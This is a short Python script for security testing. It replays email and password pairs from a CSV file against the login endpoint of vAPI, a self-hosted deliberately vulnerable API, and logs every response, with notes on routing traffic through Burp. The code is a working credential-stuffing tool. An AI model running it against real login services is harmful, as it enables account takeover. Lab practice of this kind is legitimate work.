'''
Script for fuzzing 2 parameters simultaneously in a JSON POST request. 
Similar to Burp Intruder Pitchfork attack type without the Community Edition limitations.

Proxying through Burp can be done using envrionment variables:

Powershell
$env:REQUESTS_CA_BUNDLE="Z:\PATH\TO\burpCert.pem"
$env:HTTP_PROXY="http://127.0.0.1:8080"
$env:HTTPS_PROXY="http://127.0.0.1:8080"

Bash
export REQUESTS_CA_BUNDLE="/PATH/TO/burpCert.pem"
export HTTP_PROXY="http://127.0.0.1:8080"
export HTTPS_PROXY="http://127.0.0.1:8080"
'''

import requests, csv

# Testing on self-hosted vulnerable API: https://github.com/roottusk/vapi
url = 'http://127.0.0.1/vapi/api2/user/login'

def login(email, password):
    payload = {'email': email.rstrip(),'password': password.rstrip()}
    response = requests.post(url, json=payload)
    return response


# Creating credentials tuple from csv
with open('creds.csv', newline='') as f:
    reader = csv.reader(f)
    credentials = [tuple(row) for row in reader]

'''
# Creating credentials tuple from 2 seperate files
with open('emails.txt', 'r') as f:
    emails = f.readlines()

with open('passwords.txt', 'r') as f:
    passwords = f.readlines()

credentials = zip(emails, passwords)
'''

# Saving responses to results.txt
with open('results.txt', 'a') as f:
    for cred in credentials:
        e, p = cred
        response = login(e, p)
        f.write(str(response.status_code) + ' ' + str(response.json()) + '\n')
    f.close()
